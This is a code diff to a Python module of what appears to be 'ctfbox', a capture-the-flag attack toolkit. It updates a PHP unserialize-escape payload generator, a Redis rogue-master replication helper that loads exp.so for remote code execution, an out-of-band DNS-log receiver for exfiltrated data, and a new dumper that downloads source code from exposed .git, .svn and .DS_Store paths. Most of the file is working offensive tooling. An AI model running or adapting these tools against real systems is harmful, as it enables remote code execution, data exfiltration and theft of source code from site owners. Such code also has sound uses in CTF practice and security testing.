@@ -1,3 +1,8 @@
+from ctfbox.utils.utils import md5
+import os
+import sqlite3
+from uuid import uuid4
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from enum import Enum
 from functools import partial
 from hashlib import md5 as _md5
@@ -9,21 +14,27 @@ from itertools import chain
 from json import loads
 from math import ceil
 from os import path
-from queue import Queue
-from re import match
-from threading import Thread, Lock
-from time import time
-from typing import Dict, List, Tuple, Union
-from urllib.parse import quote, quote_plus, urljoin
-from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
+from queue import Queue, Empty
+from re import match, sub, IGNORECASE
+from socket import AF_INET, SO_REUSEADDR, SOCK_STREAM, SOL_SOCKET, socket
+from tempfile import NamedTemporaryFile
+from threading import Lock, Thread
+from time import time, sleep
+from typing import Dict, List, Tuple, Union, Optional
+from urllib.parse import quote, quote_plus, urljoin, urlparse
+from zlib import decompress as zlib_decompress
 
 import requests
-import socketio
-from ctfbox.exceptions import (FlaskSessionHelperError, GeneratePayloadError,
-                               HashAuthArgumentError, HttprawError,
-                               ProvideArgumentError, ScanError)
+from ctfbox.exceptions import (DumpError, SvnParseError, DSStoreParseError,
+                               FlaskSessionHelperError,
+                               GeneratePayloadError, HashAuthArgumentError,
+                               HttprawError, ProvideArgumentError, ScanError)
+from ctfbox.thirdparty.gin import GitParse
+from ctfbox.thirdparty.dsstore import DS_Store
 from ctfbox.thirdparty.phpserialize import serialize
-from ctfbox.utils import Context, ProvideHandler, BlindXXEHandler, Threader, random_string
+from ctfbox.thirdparty.reverse_mtrand import main as reverse_mt_rand_main
+from ctfbox.utils import (bin2hex, BlindXXEHandler, Context, ProvideHandler, Threader,
+                          random_string)
 
 
 class HashType(Enum):
@@ -129,13 +140,28 @@ def _parse_form_data(body):
     return parse_dict
 
 
-def _generateTrash(diff_len: int, remain: int):
+def _generateTrashWithValue(diff_len: int, remain: int):
     pure_string_len = 12
     k = ceil((remain + pure_string_len) / diff_len)
     filed_len = k * diff_len - 12 - remain
-    result = ""
+    if filed_len == 0:
+        k += 1
+        filed_len = diff_len
     result = '''s:2:"_%s";i:%d;''' % (
         random_string(1), 10 ** (filed_len - 1))
+    return k, result
+
+
+def _generateTrashWithoutValue(diff_len: int, remain: int):
+    pure_string_len = 7
+    k = ceil((remain + pure_string_len) / diff_len)
+    filled_len = k * diff_len - 7 - remain
+    if filled_len == 0:
+        k += 1
+        filled_len = diff_len
+    num_len = filled_len
+    filled_len -= len(str(num_len))
+    result = '''s:%d:"_%s";''' % (num_len, random_string(filled_len))
     return k, result
 
 
@@ -375,8 +401,11 @@ def hashAuth(startIndex: int = 0, endIndex: int = 5, answer: str = "", maxRange:
 def httpraw(raw: Union[bytes, str], **kwargs) -> Union[requests.Response, requests.Request]:
     """Send raw request by python-requests
 
+    Origin:
+        https://github.com/boy-hack/hack-requests
+
     Args:
-    raw(bytes/str): raw http request
+        raw(bytes/str): raw http request
     kwargs:
         proxies(dict) : requests proxies. Defaults to None.
         timeout(float): requests timeout. Defaults to 60.
@@ -394,7 +423,6 @@ def httpraw(raw: Union[bytes, str], **kwargs) -> Union[requests.Response, reques
     """
     if isinstance(raw, str):
         raw = raw.encode()
-    # ? Origin: https://github.com/boy-hack/hack-requests
     raw = raw.strip()
     send = kwargs.get("send", True)
     session = kwargs.get("session", None)
@@ -560,7 +588,7 @@ def gopherraw(raw: str, host: str = "", ssrfFlag: bool = True) -> str:
     return header + data
 
 
-def php_serialize_escape(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
+def php_serialize_escape(src: str, dst: str, payload: str, paddingTrush: bool = False, newObject: bool = True) -> dict:
     """Use for generate php unserialize escape attack payload, will decide to call l2s or s2l according to the length of src and dst
 
     Args:
@@ -568,6 +596,7 @@ def php_serialize_escape(src: str, dst: str, payload: str, paddingTrush: bool = 
         dst (str): replace string, this length cannot be the same as src
         payload (str):  the php serialize data you want to insert
         paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
+        newObject (bool, optional): set to true when you want to insert a new object. Only work for short to long mode. Defaults to False.
 
     Returns:
         s2l:
@@ -589,15 +618,15 @@ def php_serialize_escape(src: str, dst: str, payload: str, paddingTrush: bool = 
     """
     diff_len = len(dst) - len(src)
     if diff_len > 0:
-        return php_serialize_escape_s2l(src, dst, payload, paddingTrush)
+        return php_serialize_escape_s2l(src, dst, payload, paddingTrush, newObject)
     elif diff_len < 0:
-        return php_serialize_escape_l2s(src, dst, payload, paddingTrush)
+        return php_serialize_escape_l2s(src, dst, payload, paddingTrush, newObject)
     else:
         raise GeneratePayloadError(
             "The length of dst cannot be the same as src")
 
 
-def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
+def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: bool = False, newObject: bool = True) -> dict:
     """
     Use for generate short to long php unserialize escape attack payload
     Tips:
@@ -608,6 +637,7 @@ def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: boo
         dst (str): replace string, this length must be greater than src
         payload (str): the php serialize data you want to insert
         paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
+        newObject (bool, optional): set to true when you want to insert a new object. Defaults to False.
 
 
     Returns:
@@ -621,15 +651,29 @@ def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: boo
     if diff_len <= 0:
         raise GeneratePayloadError("dst length must be greater than src")
 
-    padding_len, remain = divmod(len(payload) + 4, diff_len)
+    is_object = payload.startswith("O")
+    if is_object:
+        padding_len, remain = divmod(len(payload) + 3, diff_len)
+    else:
+        padding_len, remain = divmod(len(payload) + 4, diff_len)
+
     if remain != 0:
         if not paddingTrush:
             raise GeneratePayloadError(
                 "payload length error, try modify it, maybe you can put {paddingTrush=True} into the function")
-        k, trush = _generateTrash(diff_len, remain)
+        print(newObject)
+        if newObject:
+            k, trush = _generateTrashWithoutValue(diff_len, remain)
+        else:
+            k, trush = _generateTrashWithValue(diff_len, remain)
         padding_len += k
         payload = trush + payload
-    payload = '";' + payload + ";}"
+
+    if is_object:
+        payload = '";' + payload + "}"
+    else:
+        payload = '";' + payload + ";}"
+
     result = src * padding_len + payload
     result_dict = {
         'insert_data': result
@@ -637,7 +681,7 @@ def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: boo
     return result_dict
 
 
-def php_serialize_escape_l2s(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
+def php_serialize_escape_l2s(src: str, dst: str, payload: str, paddingTrush: bool = False, newObject: bool = True) -> dict:
     """
     Use for generate long to short php unserialize escape attack payload
 
@@ -649,6 +693,7 @@ def php_serialize_escape_l2s(src: str, dst: str, payload: str, paddingTrush: boo
         dst(str): replace string, this length must be shorter than search
         payload(str): the php serialize data you want to insert
         paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
+        newObject (bool, optional): useless.
 
     Returns:
         dict:
@@ -851,86 +896,75 @@ class OOB():
         prepare(self, data) -> str  # prepare url which you can send with data
 
     Note:
-        power by socket.io and dnslog.io
+        power by dnslog.cn
 
     Example:
         with OOB() as oob:
-            domain = oob.domain # get domain
-            requests.get(oob.prepare("test")) # send "test" and you will receive it
-            for data in oob:
-                print(data)
-
+            domain = oob.domain  # get domain
+            requests.get(oob.prepare("test"))  # send "test" and you will receive it
+            print(oob.get_one())
     """
 
     def __init__(self, showDomain: bool = True, debug: bool = False):
-        sio = socketio.Client()
-        self.sio = sio
-        self._queue = Queue()
-        self._debug = debug
-        self._unique = []
-        self._showDomain = showDomain
-        self._updateTime = time()
-        self._domainlock = Lock()
-        self._domainlock.acquire()
-
-        @sio.on("randomDomain")
-        def randomDomain(data):
-            domain = data["domain"]
-            self._showDomain and print('DnsLog domain:', domain)
-            self.domain = domain
-            self._domainlock.release()
-
-        @sio.on("dnslog")
-        def dnslog(data):
-            current_time = time()
-            if current_time - self._updateTime > 3.0:
-                del self._unique
-                self._unique = []
-                self._updateTime = current_time
-            message = data["dnslog"]
-            message = message.split(".")[0]
-            if message not in self._unique:
-                self._unique.append(message)
-                self._queue.put(message)
-
-        @sio.event
-        def connect():
-            self._debug and print("websocket connected")
-
-        @sio.event
-        def connect_error(data):
-            self._debug and print("websocket connection failed")
-
-        @sio.event
-        def disconnect():
-            self._debug and print("websocket disconnect")
-
-        sio.connect("https://dnslog.io/")
-
-    def __iter__(self):
-        return self
-
-    def __next__(self):
-        data = self._queue.get()
-        return data
-
-    def __getattribute__(self, name):
-        if name == "domain":
-            self._domainlock.acquire()
-            domain = object.__getattribute__(self, "domain")
-            self._domainlock.release()
-            return domain
-        return object.__getattribute__(self, name)
+        self._queue = Queue(-1)
+        self._hashlist = []
+        self._cookies = {"PHPSESSID": str(uuid4())}
+        self.domain = self._get_domain()
 
     def __enter__(self):
         return self
 
     def __exit__(self, exc_type, exc_value, trace):
-        try:
-            self.sio.disconnect()
-        except Exception:
-            print("close socket.io failed")
-            return True
+        del self._queue
+
+    def _get_domain(self):
+        res = requests.get("http://dnslog.cn/getdomain.php",
+                           cookies=self._cookies)
+        return res.text.strip()
+
+    def get_one(self, no_wait=True, interval=0.5, timeout=5) -> Optional[str]:
+        """Get the latest one record.
+
+        Args:
+            no_wait (bool, optional): whether unblocking. Defaults to True.
+            interval (float, optional): interval seconds. Defaults to 0.5.
+            timeout (int, optional): timeout seconds. Defaults to 5.
+
+        Returns:
+            Optional[str]: record data
+        """
+        past_time = 0
+        while True:
+            self._get()
+            try:
+                return self._queue.get_nowait()
+            except Empty:
+                if no_wait:
+                    return None
+                else:
+                    sleep(interval)
+                    past_time += interval
+                    if past_time >= timeout:
+                        return None
+
+    def _get(self):
+        res = requests.get("http://dnslog.cn/getrecords.php",
+                           cookies=self._cookies)
+        records = '{"records":' + res.text.strip() + "}"
+        records = loads(records)["records"]
+
+        for record in records:
+            if len(record) != 3:
+                continue
+            record_hash = md5(str(record))
+            if record_hash in self._hashlist:
+                continue
+
+            self._hashlist.append(record_hash)
+            data = record[0].split(".", 1)[0]
+
+            self._queue.put(data)
+
 
     def prepare(self, data) -> str:
         """prepare url which you can send with data
@@ -1135,7 +1169,7 @@ def gopherredis_msr(host: str, masterHost: str = "127.0.0.1:2020", authPass: str
 
     def RogueServer(ip, port):
         expfp = expFilePath or path.join(path.split(path.realpath(__file__))[
-                                               0], "../", "thirdparty", "redis", "exp.so")
+            0], "../", "thirdparty", "redis", "exp.so")
         with open(expfp, "rb") as f:
             exp = f.read()
 
@@ -1149,7 +1183,7 @@ def gopherredis_msr(host: str, masterHost: str = "127.0.0.1:2020", authPass: str
         while flag:
             getData = client.recv(1024)
             if b"PING" in getData:
-                client.send(b"+PING\r\n")
+                client.send(b"+PONG\r\n")
                 flag = True
             elif b"REPLCONF" in getData:
                 client.send(b"+OK\r\n")
@@ -1178,7 +1212,7 @@ def gopherredis_msr(host: str, masterHost: str = "127.0.0.1:2020", authPass: str
     print("--- Build server ---")
     host_list = masterHost.split(":")
     ip, port = host_list[0], host_list[1]
-    print(f"Listen on {host}:{port}... ")
+    print(f"Listen on {ip}:{port}... ")
     RogueServer(ip=ip, port=int(port))
 
     print("--- Load module ---")
@@ -1223,3 +1257,331 @@ def gopherredis_msr(host: str, masterHost: str = "127.0.0.1:2020", authPass: str
             print("--- exit ---")
         except Exception as e:
             print(f"--- Error: {e} ---")
+
+
+class _BasicDumper(object):
+
+    def __init__(self, url: str, outdir: str, threadNum: int = 20):
+        self.url = url
+        self.outdir = outdir
+        self.targets = []
+        self.headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41"
+        }
+        self.threadNum = threadNum
+        self.lock = Lock()
+        self.session = requests.Session()
+
+    def start(self):
+        self.dump()
+
+    def dump(self):
+        pass
+
+    def download(self, target: tuple):
+        url, filename = target
+
+        # 创建目标目录（filename可能包含部分目录）
+        fullname = os.path.join(self.outdir, filename)
+        outdir = os.path.dirname(fullname)
+        if outdir:
+            if not os.path.exists(outdir):
+                try:
+                    os.makedirs(outdir)
+                except FileExistsError:
+                    pass
+            elif os.path.isfile(outdir):
+                # 如果之前已经作为文件写入了，则需要删除
+                self.lock.acquire()
+                print(
+                    "Dump warning: %s is a file, it will be replace as a folder" % outdir)
+                self.lock.release()
+                os.remove(outdir)
+                os.makedirs(outdir)
+
+        # 获取数据
+        status, data = self.fetch(url)
+        if status != 200 or data is None:
+            # None才代表出错，data可能为b""
+            raise DumpError("Fetch file error: [%s] %s %s" % (
+                status, url, filename))
+        self.lock.acquire()
+        print("[+] %s" % (filename))
+        self.lock.release()
+
+        # 处理数据（如有必要）
+        data = self.convert(data)
+
+        # 保存数据
+        try:
+            with open(fullname, "wb") as f:
+                f.write(data)
+        except IsADirectoryError:
+            # 多协程/线程/进程下，属于正常情况
+            pass
+        except Exception as e:
+            self.lock.acquire()
+            print("Dump error: %s %s" % (url, filename))
+            print(str(e.args))
+            self.lock.release()
+
+    def convert(self, data: bytes) -> bytes:
+        """ 处理数据 """
+        return data
+
+    def fetch(self, url: str, times: int = 3) -> tuple:
+        """ 从URL获取内容，如果失败默认重试三次 """
+        # # TODO：下载大文件需要优化
+        s = self.session
+        while times:
+            try:
+                res = s.get(url, headers=self.headers)
+                ret = (res.status_code, res.content)
+                return ret
+            except Exception:
+                times -= 1
+        return (0, None)
+
+    def startPool(self):
+        with ThreadPoolExecutor(max_workers=self.threadNum) as pool:
+            tasks = [pool.submit(self.download, target)
+                     for target in self.targets]
+            for task in as_completed(tasks):
+                err = task.exception()
+                if err:
+                    if isinstance(err, DumpError):
+                        print("Dump error: %s" % err)
+                    else:
+                        raise err
+
+    def parse(self, url: str):
+        """ 从URL下载文件并解析 """
+        pass
+
+    def indexfile(self, url: str) -> NamedTemporaryFile:
+        """ 创建一个临时索引文件index/wc.db """
+        idxfile = NamedTemporaryFile(delete=False)
+        status, data = self.fetch(url)
+        if not data:
+            raise DumpError("Fetch index file error")
+        with open(idxfile.name, "wb") as f:
+            f.write(data)
+        return idxfile
+
+
+class _GitDumper(_BasicDumper):
+    def __init__(self, url: str, outdir: str, threadNum: int = 20):
+        super(_GitDumper, self).__init__(url, outdir, threadNum)
+        self.base_url = sub("\.git.*", ".git", url)
+
+    def start(self):
+        """ 入口方法 """
+        self.dump()
+
+    def dump(self):
+        try:
+            idxFile = self.indexfile(self.base_url + "/index")
+            for entry in GitParse(idxFile.name):
+                if "sha1" in entry.keys():
+                    sha1 = entry.get("sha1", "").strip()
+                    filename = entry.get("name", "").strip()
+                    if not sha1 or not filename:
+                        continue
+                    targetUrl = "%s/objects/%s/%s" % (
+                        self.base_url, sha1[:2], sha1[2:])
+                    self.targets.append((targetUrl, filename))
+            self.startPool()
+        finally:
+            if idxFile:
+                os.remove(idxFile.name)
+
+    def convert(self, data: bytes) -> bytes:
+        """ 用zlib对数据进行解压 """
+        if data:
+            try:
+                data = zlib_decompress(data)
+                # Bytes正则匹配
+                data = sub(rb"blob \d+\x00", b"", data)
+            except Exception as e:
+                print("Dump error: %s " % str(e.args))
+        return data
+
+
+class _SvnDumper(_BasicDumper):
+    def __init__(self, url: str, outdir: str, threadNum: int = 20):
+        super(_SvnDumper, self).__init__(url, outdir, threadNum)
+        self.base_url = sub("\.svn.*", ".svn", url)
+
+    def start(self):
+        """ dumper入口方法 """
+        entries_url = self.base_url + "/entries"
+        status, data = self.fetch(entries_url)
+        if not data:
+            raise SvnParseError("Fetch entries file error")
+        if data == b"12\n":
+            self.dump()
+        else:
+            # TODO: 针对svn1.7以前的版本
+            print("SVN version before 1.7, todo")
+            self.dump_legacy()
+
+    def dump(self):
+        try:
+            """ 针对svn1.7以后的版本 """
+            # 创建一个临时文件用来存储wc.db
+            idxFile = self.indexfile(self.base_url + "/wc.db")
+            # 从wc.db中解析URL和文件名
+            for item in self.parse(idxFile.name):
+                sha1, filename = item
+                if not sha1 or not filename:
+                    continue
+                url = "%s/pristine/%s/%s.svn-base" % (
+                    self.base_url, sha1[6:8], sha1[6:])
+                self.targets.append((url, filename))
+            idxFile.close()
+            self.startPool()
+        finally:
+            if idxFile:
+                os.remove(idxFile.name)
+
+    def dump_legacy(self):
+        """ 针对svn1.7以前的版本 """
+        pass
+
+    def parse(self, filename: str) -> list:
+        """ sqlite解析wc.db并返回一个(hash, name)组成列表 """
+        try:
+            conn = sqlite3.connect(filename)
+            cursor = conn.cursor()
+            cursor.execute("select checksum, local_relpath from NODES")
+            items = cursor.fetchall()
+            cursor.execute(
+                "select checksum, substr(md5_checksum,7) from PRISTINE")
+            items.extend(cursor.fetchall())
+            newitems = []
+            checksumList = []
+            for item in items:
+                if (item[0]) not in checksumList:
+                    checksumList.append(item[0])
+                    newitems.append(item)
+            conn.close()
+            return newitems
+        except Exception as e:
+            raise SvnParseError(
+                "Invalid .svn / Sqlite connection failed") from e
+
+
+class _DSStoreDumper(_BasicDumper):
+    def __init__(self, url: str, outdir: str, threadNum: int = 20):
+        super(_DSStoreDumper, self).__init__(url, outdir, threadNum)
+        self.base_url = sub("/\.DS_Store.*", "", url, flags=IGNORECASE)
+        self.url_queue = Queue()
+
+    def start(self):
+        self.url_queue.put(self.base_url)
+        self.parse_loop()
+        self.dump()
+
+    def dump(self):
+        self.startPool()
+
+    def parse_loop(self):
+        """ 从url_queue队列中读取URL，根据URL获取并解析DS_Store """
+        while not self.url_queue.empty():
+            base_url = self.url_queue.get()
+            status, ds_data = self.fetch(base_url + "/.DS_Store")
+            if status != 200 or not ds_data:
+                continue
+            try:
+                # 解析DS_Store
+                ds = DS_Store(ds_data)
+                sets = set(ds.traverse_root())
+                if not sets:
+                    raise DSStoreParseError("Empty .DS_Store")
+                for filename in sets:
+                    new_url = "%s/%s" % (base_url, filename)
+                    self.url_queue.put(new_url)
+                    # 从URL中获取path并删除最前面的/
+                    # 不删除/会导致path.join出错，从而导致创建文件失败
+                    fullname = urlparse(new_url).path.lstrip("/")
+                    self.targets.append((new_url, fullname))
+            except Exception as e:
+                # 如果解析失败则不是DS_Store文件
+                raise DSStoreParseError("Invalid .DS_Store") from e
+
+
+def leakdump(url: str, outputDir: str = "", threadNum: int = 20):
+    """A function for source code leaks, support .git .svn .DS_Store
+
+    Origin:
+        https://github.com/0xHJK/dumpall
+
+    Args:
+        url (str): the target url.
+        outputDir (str, optional): Output directory. Defaults to ./{hostname}.
+        threadNum (int, optional): thread number. Defaults to 20.
+
+    Raises:
+        DumpError
+
+    Example:
+        leakdump("http://example.com/.git")
+        leakdump("http://example.com/.svn")
+        leakdump("http://example.com/.DS_Store")
+    """
+
+    url = url.rstrip("/")
+    lower_url = url.lower()
+    if not outputDir:
+        parsed_url = urlparse(url)
+        outputDir = path.join("./", parsed_url.hostname)
+    availiable_endswith = [".git", ".svn", ".ds_store"]
+    if not any(ends for ends in availiable_endswith if lower_url.endswith(ends)):
+        raise DumpError("Not availiable url")
+
+    if lower_url.endswith(".git"):
+        dumper = _GitDumper(url, outputDir, threadNum)
+        dumper.start()
+
+    if lower_url.endswith(".svn"):
+        dumper = _SvnDumper(url, outputDir, threadNum)
+        dumper.start()
+
+    if lower_url.endswith(".ds_store"):
+        dumper = _DSStoreDumper(url, outputDir, threadNum)
+        dumper.start()
+
+
+def reverse_mt_rand(_R000: int, _R227: int, offset: int, flavour: int) -> int:
+    """reverse mt_rand seed without brute force
+
+    Origin:
+        https://github.com/ambionics/mt_rand-reverse
+
+    Args:
+        _R000 (int): first random value.
+        _R227 (int): 228th random value.
+        offset (int): number of mt_rand() calls in between the seeding and the first value.
+        flavour (int): 0 (PHP5) or 1 (PHP7+)
+
+    Returns:
+        int: the seed
+    """
+    return reverse_mt_rand_main(_R000, _R227, offset, flavour)
+
+
+def php_serialize_S(string: str) -> str:
+    """change normal string to php serialize S stirng
+
+    Args:
+        string (str): normal string
+
+    Returns:
+        str: php serialize S stirng
+    """
+    string = bin2hex(string)
+    if not string:
+        return ""
+
+    return "".join("\\" + string[i:i+2] for i in range(0, len(string), 2))
